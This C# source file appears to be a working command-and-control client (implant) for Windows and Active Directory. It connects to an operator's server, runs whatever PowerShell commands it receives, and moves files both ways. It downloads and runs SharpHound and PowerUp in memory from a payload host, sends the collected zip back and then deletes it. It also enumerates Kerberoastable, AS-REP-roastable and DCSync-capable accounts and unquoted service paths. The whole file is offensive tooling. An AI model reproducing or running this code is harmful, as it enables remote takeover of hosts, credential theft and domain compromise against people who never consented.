using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.Threading;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
//using System.Runtime.InteropServies;
using System.DirectoryServices.AccountManagement;
using System.Collections;
using System.Security.Principal;
using System.Security.AccessControl;

namespace C2Client
{
    class Program
    {

        public string GetResult(string cmd)
        {
            string result;
            try
            {


                RunspaceConfiguration rc = RunspaceConfiguration.Create();
                Runspace r = RunspaceFactory.CreateRunspace(rc);
                r.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = r;
                ps.AddScript(cmd);

                Collection<PSObject> po = ps.Invoke();


                StringWriter sw = new StringWriter();

                foreach (PSObject p in po)
                {
                    sw.WriteLine(p.ToString());
                }

                result = sw.ToString();

            }
            catch (Exception e)
            {
                result = e.Message;
            }
            Console.WriteLine("Result {0}", result);
            return result;


        }

        public string UploadToServer(Socket cs, string filename)
        {
            lock (this)
            {
                string result;

                byte[] b = File.ReadAllBytes(filename);
                result = Convert.ToBase64String(b);
                return result;
            }
        }


        public string DownloadFromServer(Socket c, string filename, string dest, int file_size)
        {
            lock (this)
            {
                string result;
                try
                {
                    byte[] contents = new byte[file_size];
                    Array.Clear(contents, 0, contents.Length);
                    c.Receive(contents);
                    string file2 = Path.GetFileName(filename);
                    Console.WriteLine(file2);
                    FileStream fs = File.Open(dest, FileMode.OpenOrCreate, FileAccess.ReadWrite);
                    fs.Write(contents, 0, contents.Length);
                    fs.Close();
                    result = "got file";
                }
                catch (Exception e)
                {
                    result = e.Message;
                }
                return result;
            }

        }

        public string GetSharpHoundZip(Socket c, string url)
        {
            string result;
            try
            {
                string cmd = String.Format(@"iex(new-object net.webclient).downloadstring('{0}')", url);
                Console.WriteLine(cmd);

                RunspaceConfiguration rc = RunspaceConfiguration.Create();
                Runspace r = RunspaceFactory.CreateRunspace(rc);
                r.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = r;
                ps.AddScript(cmd);


                Collection<PSObject> po = ps.Invoke();



                StringWriter sw = new StringWriter();

                foreach (PSObject p in po)
                {
                    sw.WriteLine(p.ToString());
                }
                ps.Stop();
                r.Close();
                Thread.Sleep(5000);
                result = sw.ToString();
                Console.WriteLine("Result is " + result);

                var files = Directory.EnumerateFiles(@"C:\Users\Administrator\Desktop", "pwn*temp.zip", SearchOption.AllDirectories);
                foreach (string f in files)
                {
                    Console.WriteLine(f);

                    
                    //Thread.Sleep(5000);
                    //File.WriteAllBytes(@"C:\Windows\Temp\test.zip", b);
                    //string b64 =Convert.ToBase64String(b);
                    c.Send(File.ReadAllBytes(f));
                   Console.WriteLine(File.ReadAllBytes(f).Length);
                    // Thread.Sleep(2000);
                    File.Delete(f);

                }

            }
            catch (Exception e)
            {
                result = e.Message;
            }

            return result;


        }

        public string GetASREPRoastable(Socket c)
        {
            // User access control values
            List<string> l = new List<string>();
            l.Add(""); l.Add("ACCOUNTDISABLE"); l.Add(""); l.Add("HOMEDIR_REQUIRED");
            l.Add("LOCKOUT"); l.Add("PASSWD_NOTREQD"); l.Add("PASSWD_CANT_CHANGE");
            l.Add("ENCRYPTED_TEXT_PWD_ALLOWED"); l.Add("TEMP_DUPLICATE_ACCOUNT");
            l.Add("NORMAL_ACCOUNT"); l.Add(""); l.Add("INTERDOMAIN_TRUST_ACCOUNT");
            l.Add("WORKSTATION_TRUST_ACCOUNT"); l.Add("SERVER_TRUST_ACCOUNT"); l.Add(""); l.Add("");
            l.Add("DONT_EXPIRE_PASSWORD"); l.Add("MNS_LOGON_ACCOUNT");
            l.Add("SMARTCARD_REQUIRED"); l.Add("TRUSTED_FOR_DELEGATION");
            l.Add("NOT_DELEGATED"); l.Add("USE_DES_KEY_ONLY");
            l.Add("DONT_REQ_PREAUTH"); l.Add("PASSWORD_EXPIRED");
            l.Add("TRUSTED_TO_AUTH_FOR_DELEGATION");
            //l.Reverse();
            string result = "";
            try
            {
                Forest f = Forest.GetCurrentForest();
                DomainCollection domains = f.Domains;
                foreach (Domain d in domains)
                {
                    string domainName = d.Name.ToString();
                    string[] dcs = domainName.Split('.');
                    for (int i = 0; i < dcs.Length; i++)
                    {
                        dcs[i] = "DC=" + dcs[i];

                    }

                    StringWriter sw = new StringWriter();

                    // DC=tech69,DC=local,DC=net 
                    DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
                    DirectorySearcher ds = new DirectorySearcher();
                    ds.SearchRoot = de;
                    ds.Filter = "(&(objectclass=user)(useraccountcontrol>=4194304))";
                    foreach (SearchResult sr in ds.FindAll())
                    {
                        sw.WriteLine("User: {0} from Domain: {1}", sr.Properties["samaccountname"][0], domainName);
                        sw.WriteLine("UserAccountControl: {0}", sr.Properties["useraccountcontrol"][0]);
                        int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
                        string uac_binary = Convert.ToString(uac, 2);
                        List<string> flags = new List<string>();
                        //Console.WriteLine(l.Count);
                        //Console.WriteLine(uac_binary.Length);
                        for (int i = 0; i < uac_binary.Length; i++)
                        {
                            int result2 = uac & Convert.ToInt32(Math.Pow(2, i));
                            if (result2 != 0)
                            {
                                //Console.WriteLine(l[i]);
                                flags.Add(l[i]);
                            }

                        }
                        foreach (string temp in flags)
                        {
                            sw.WriteLine(temp);
                        }
                        sw.WriteLine();

                    }

                    result += sw.ToString();


                }
                Console.WriteLine("Result is-->{0}<--", result);
                if (result == "")
                {
                    result = "No accounts found";
                }
            }

            catch (Exception e)
            {
                result = e.Message;
            }

            return result;
        }

        public string GetKerberoastable()
        {
            string result ="";
            try
            {

                Forest f = Forest.GetCurrentForest();
                DomainCollection domains = f.Domains;
                foreach (Domain d in domains)
                {
                    string domainName = d.Name.ToString();
                    string[] dcs = domainName.Split('.');
                    for (int i = 0; i < dcs.Length; i++)
                    {
                        dcs[i] = "DC=" + dcs[i];

                    }

                    StringWriter sw = new StringWriter();

                    // DC=tech69,DC=local,DC=net 
                    DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
                    DirectorySearcher ds = new DirectorySearcher();
                    ds.SearchRoot = de;
                    ds.Filter = "(&(objectclass=user)(serviceprincipalname=*))";

                    foreach(SearchResult sr in ds.FindAll())
                    {
                        sw.WriteLine("Sam Account Name: {0}", sr.Properties["samaccountname"][0]);
                        sw.WriteLine("Service Principal Name: {0}", sr.Properties["serviceprincipalname"][0]);
                        sw.WriteLine();
                    }

                    result += sw.ToString();
                }
                if (result == "")
                {
                    result = "No Accounts found";
                }
            }
            catch (Exception e)
            {
                result = e.Message;
            }

            return result;

        }

        public string RunPSScript(string url)
        {
            string result = "";
            RunspaceConfiguration rc = RunspaceConfiguration.Create();
            Runspace r = RunspaceFactory.CreateRunspace(rc);
            r.Open();

            string cmd = String.Format(@"iex(new-object net.webclient).downloadstring('{0}')", url) ;
            StringWriter sw = new StringWriter();

            PowerShell ps =PowerShell.Create();
            ps.Runspace = r;
            ps.AddScript(cmd);
            Console.WriteLine(cmd);
            Collection<PSObject> po = ps.Invoke();

            //Thread.Sleep(3000);

            foreach(PSObject p in po)
            {
                sw.WriteLine(p.ToString());
            }
            ps.Stop();
            r.Close();
            // Thread.Sleep(4000);
            result += sw.ToString();
            Console.WriteLine("---------------result-------");
            Console.WriteLine(result);
            return result;

        }
        public StringWriter GetAllMembers(string groupName, string domainName,StringWriter sw)
        {
            
            PrincipalContext p = new PrincipalContext(ContextType.Domain, domainName);
            GroupPrincipal gp = GroupPrincipal.FindByIdentity(p, groupName);
            foreach (Principal group in gp.GetMembers())
            {
                if (group.StructuralObjectClass == "user")
                {
                    sw.WriteLine("User: {0} is memberOf {1}", group.Name, groupName);
                }
                if (group.StructuralObjectClass == "group")
                {
                    sw.WriteLine("Group: {0} is memberOf {1}", group.Name, groupName);
                    (new Program()).GetAllMembers(group.Name, domainName,sw);
                }
            }
            return sw;
        }

        public string GetDCSyncUsers(string domainDN)
        {
            string result;
            Console.WriteLine(domainDN);
            StringWriter sw = new StringWriter();
            sw.WriteLine("-------- DOMAIN: {0} ---------", domainDN);
            Hashtable ht = new Hashtable();
            ht.Add("DS-Replication-Get-Changes", "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2");
            ht.Add("DS-Replication-Get-Changes-All", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2");
            ht.Add("DS-Replication-Get-Changes-In-Filtered-Set", "89e95b76-444d-4c62-991a-0facbeda640c");
            ht.Add("DS-Replication-Manage-Topology", "1131f6ac-9c07-11d1-f79f-00c04fc2dcd2");
            ht.Add("DS-Replication-Monitor-Topology", "f98340fb-7c5b-4cdb-a00b-2ebdfa115a96");
            ht.Add("DS-Replication-Synchronize", "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2");

            DirectoryEntry de = new DirectoryEntry("LDAP://" + domainDN);
            DirectorySearcher ds = new DirectorySearcher();
            ds.SearchRoot = de;

            foreach (SearchResult sr in ds.FindAll())
            {
                try
                {
                    DirectoryEntry temp = sr.GetDirectoryEntry();
                    AuthorizationRuleCollection arc = temp.ObjectSecurity.GetAccessRules(true, true, typeof(NTAccount));

                    foreach (ActiveDirectoryAccessRule a in arc)
                    {
                        if (domainDN.Contains(temp.Name.ToString()))
                        {

                            foreach (DictionaryEntry d in ht)
                            {
                                if (d.Value.ToString() == a.ObjectType.ToString())
                                {
                                    sw.WriteLine(a.IdentityReference);
                                    sw.WriteLine(d.Key.ToString());
                                    sw.WriteLine(a.ObjectType);
                                    //sw.WriteLine(a.AccessControlType);
                                    //sw.WriteLine(a.ActiveDirectoryRights);

                                    sw.WriteLine();
                                }
                            }
                        }
                    }
                }
                catch { }
            }
            result = sw.ToString();
            return result;
        }
        public static void Main(string[] args)
        {
            if (args.Length != 4)
            {
                Console.WriteLine("Usage: exe IP PORT PAYLOAD_SERVER_IP PORT");
                System.Environment.Exit(0);
            }

            try
            {

                IPEndPoint ipe = new IPEndPoint(IPAddress.Parse(args[0]), Convert.ToInt32(args[1]));

                Socket cs = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                cs.Connect(ipe);


                byte[] buffer = new byte[10240];
                string cmd;
                cmd = "Hello world";


                cs.Send(Encoding.ASCII.GetBytes(cmd));

                Array.Clear(buffer, 0, buffer.Length);
                cs.Receive(buffer);
                Console.WriteLine("Received {0}", Encoding.ASCII.GetString(buffer).TrimEnd('\0'));

                cmd = Encoding.ASCII.GetString(buffer).TrimEnd('\0');

                while (Encoding.ASCII.GetString(buffer).TrimEnd('\0') != "quit")
                {
                    cmd = Encoding.ASCII.GetString(buffer).TrimEnd('\0');

                    if (cmd.Split(' ')[0].ToLower() == "download")
                    {
                        // download filename
                        string filename = cmd.Split(' ')[1];
                        Program p = new Program();
                        Thread uploader = new Thread(() => { cmd = p.UploadToServer(cs, filename); });
                        uploader.Name = "Uploader to server";
                        uploader.Start();
                        uploader.Join();
                        // Thread.Sleep(5000);
                        /*
                        byte[] filecontents = File.ReadAllBytes(filename);
                        string base64contents = Convert.ToBase64String(filecontents);
                        cmd = base64contents;*/
                    }
                    else if (cmd.Split(' ')[0].ToLower() == "upload")
                    {
                        Console.WriteLine(cmd);
                        // upload filename destination filesize
                        string filename_to_download = cmd.Split(' ')[1];
                        string destinationfile = cmd.Split(' ')[2];
                        int filesize2 = Convert.ToInt32(cmd.Split(' ')[3]);

                        Program p = new Program();
                        Thread downloader = new Thread(() => { cmd = p.DownloadFromServer(cs, filename_to_download, destinationfile, filesize2); });
                        downloader.Name = "File Downloader";
                        downloader.Start();
                        downloader.Join();
                        //File.WriteAllBytes(@"C:\Windows\Temp\" + file2, contents);

                        // Thread.Sleep(3000);
                        cmd = "got file";

                    }
                    else if (cmd == "Get-SharpHoundZip")
                    {
                        // download sharphound.ps1, execute it and save output
                        // to zipfile, upload that zip file to server
                        // delete that zipfile 
                        // url to payload server hosting scripts
                        string payload = String.Format("http://{0}:{1}/sharphound.ps1", args[2], args[3]);

                        Program p = new Program();
                        Thread sharp = new Thread(() => { cmd = p.GetSharpHoundZip(cs, payload); });
                        sharp.Name = "Sharphoundzip";
                        sharp.Start();
                        sharp.Join();
                        Thread.Sleep(2000);

                    }
                    else if (cmd == "Get-ASREPRoastable")
                    {
                        Program p = new Program();
                        Thread asrep = new Thread(() => { cmd = p.GetASREPRoastable(cs); });
                        asrep.Name = "asreproastable";
                        asrep.Start();
                        asrep.Join();
                        Console.WriteLine(cmd);

                    }
                    else if (cmd == "Get-Kerberoastable")
                    {
                        Program p = new Program();
                        Thread kerberoast = new Thread(() => { cmd = p.GetKerberoastable(); });
                        kerberoast.Name = "Get-Kerberoastable";
                        kerberoast.Start();
                        kerberoast.Join();

                    }

                    else if (cmd == "Get-GroupRecursive")
                    {

                        Program p = new Program();
                        Forest f = Forest.GetCurrentForest();
                        DomainCollection domains = f.Domains;
                        StringWriter sw = new StringWriter();
                        foreach (Domain d in domains)
                        {
                            string domainName = d.Name.ToString();
                            string[] dcs = domainName.Split('.');
                            for (int i = 0; i < dcs.Length; i++)
                            {
                                dcs[i] = "DC=" + dcs[i];

                            }
                            DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
                            DirectorySearcher ds = new DirectorySearcher();
                            ds.SearchRoot = de;
                            ds.Filter = "(objectclass=group)";

                            sw.WriteLine("-----Domain: {0}-----", domainName);
                            foreach (SearchResult sr in ds.FindAll())
                            {
                                sw.WriteLine("------{0}------", sr.Properties["samaccountname"][0]);
                                Thread groups = new Thread(() => { sw = p.GetAllMembers(sr.Properties["samaccountname"][0].ToString(), domainName, sw); });
                                groups.Start();
                                groups.Join();
                                sw.WriteLine();
                            }

                        }

                        //Thread groups = new Thread(() => { sw = p.GetAllMembers("Domain Admins", d.Name, sw); });
                        // groups.Name = "groups";

                        Thread.Sleep(2000);
                        cmd = sw.ToString();
                        Console.WriteLine(cmd);


                    }

                    else if (cmd == "powerup")
                    {
                        //get powerupps1 and execute in memory
                        string url = String.Format("http://{0}:{1}/powerup.ps1", args[2], args[3]);
                        Program p = new Program();
                        Thread runpsscript = new Thread(() => { cmd = p.RunPSScript(url); });
                        //cmd = p.RunPSScript(url);
                        runpsscript.Start();
                        runpsscript.Join();

                        Thread.Sleep(1000);


                    }

                    else if (cmd == "Get-DCSyncUsers")
                    {

                        Forest f = Forest.GetCurrentForest();
                        DomainCollection domains = f.Domains;
                        cmd = "";
                        foreach(Domain d in domains)
                        {
                            string domainName = d.Name;

                            string[] dcs = domainName.Split('.');
                            for(int i = 0; i < dcs.Length; i++)
                            {
                                dcs[i] = "DC=" + dcs[i];
                            }

                            string domainDN = String.Join(",", dcs);

                            Program p = new Program();
                            Thread dcsync = new Thread(() => { cmd += p.GetDCSyncUsers(domainDN); });
                            dcsync.Name = "get-dcsyncusers";
                            dcsync.Start();
                            dcsync.Join();

                            


                        }

                        Thread.Sleep(2000);
                    }

                    else if (cmd == "unquotedservices")
                    {

                        Program p = new Program();
                        string sep = @"wmic service get name,pathname | findstr /v /i system32 | findstr /v \`" +'"';
                        Console.WriteLine(sep);
                        cmd = p.GetResult(sep);
                        Console.WriteLine(cmd);
                    
                    }
                    else
                    {
                        Program p = new Program();

                        cmd = p.GetResult(cmd);
                    }

                    if (cmd == "")
                    {
                        cmd = "Error Occurred";
                    }
                    cs.Send(Encoding.ASCII.GetBytes(cmd));
                    Console.WriteLine("[+] Sent {0}", cmd);
                    Console.WriteLine(cmd.Length.ToString());

                    Array.Clear(buffer, 0, buffer.Length);
                    cs.Receive(buffer);
                }
                cs.Close();
            }
            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
            }
            // Console.WriteLine("Press any key to continue");
            // Console.ReadKey();
        }
    }
}